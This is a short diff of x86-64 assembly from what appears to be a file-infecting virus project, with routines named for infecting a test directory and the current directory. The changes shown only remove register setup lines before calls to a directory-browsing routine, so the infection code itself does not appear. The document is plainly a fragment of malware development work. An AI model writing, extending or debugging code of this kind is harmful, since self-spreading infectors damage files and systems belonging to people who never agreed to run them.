@@ -68,10 +68,8 @@ _infect_tmp_test:
 	push	rax
 	push	rsi
 	push	rdi
-	mov rdx, 0x00000001
 	call	_read_dir						; call our directory browsing function
 
-	mov rdx, 0x00000001
 	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
 	call	_read_dir						; call our directory browsing function
 
@@ -104,7 +102,6 @@ _stack_infect_current_dir_without_exec:
 	push	rax
 	push	rsi
 	push	rax
-	mov rdx, 0x00000001
 	call	_read_dir
 
 	pop rdi
@@ -131,7 +128,6 @@ _reg_infect_current_dir_without_exec:
 	push	rax
 	push	rsi
 	push	rax
-	mov rdx, 0x00000001
 	call	_read_dir
 	
 	pop		rdi
